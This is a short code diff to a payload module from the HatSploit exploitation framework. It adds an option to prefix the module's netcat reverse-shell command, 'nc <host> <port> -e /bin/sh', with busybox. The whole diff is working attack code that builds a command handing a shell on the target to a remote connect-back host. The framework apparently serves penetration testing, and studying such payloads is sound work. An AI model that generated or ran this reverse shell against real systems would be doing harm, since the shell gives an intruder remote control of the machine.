@@ -39,11 +39,20 @@ class HatSploitPayload(Payload):
             'Value': 8888,
             'Type': "port",
             'Required': True
+        },
+        'BUSYBOX': {
+            'Description': "Invoke from busybox.",
+            'Value': "no",
+            'Type': "boolean",
+            'Required': False
         }
     }
 
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
+        connback_host, connback_port, busybox = self.parse_options(self.options)
 
         payload = f"nc {connback_host} {connback_port} -e /bin/sh"
+        if busybox.lower() in ['yes', 'y']:
+            payload = f"busybox {payload}"
+
         return payload
